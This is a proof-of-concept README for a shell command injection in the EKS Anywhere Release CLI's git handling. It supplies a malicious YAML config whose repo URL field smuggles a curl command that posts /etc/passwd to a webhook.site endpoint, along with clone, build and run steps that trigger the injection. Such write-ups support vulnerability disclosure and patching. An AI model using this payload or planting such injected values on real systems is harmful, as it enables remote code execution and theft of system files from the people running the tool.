# EKS Anywhere Release CLI - Command Injection PoC

## Vulnerability
Shell command injection in `release/cli/pkg/git/git.go` via config file or CLI flags.

## Attack Vector
The Release CLI reads configuration from:
- `~/.eks-anywhere.yaml` (default)
- `--config <file>` flag
- Environment variables (e.g., `CLI_REPO_URL`)

## Malicious Config File (malicious-config.yaml)
```yaml
cli-repo-url: "http://x; curl -d @/etc/passwd https://webhook.site/YOUR_ID #"
build-repo-url: "http://y"
```

## Exploitation
```bash
# Clone and build release CLI
git clone https://github.com/aws/eks-anywhere.git
cd eks-anywhere/release/cli
go build -o release-cli .

# Clone this PoC repo
git clone https://github.com/helitestacc/eksanywhere.git /tmp/poc
cd /tmp/poc

# Run with malicious config - triggers RCE
/path/to/release-cli release --config malicious-config.yaml
```
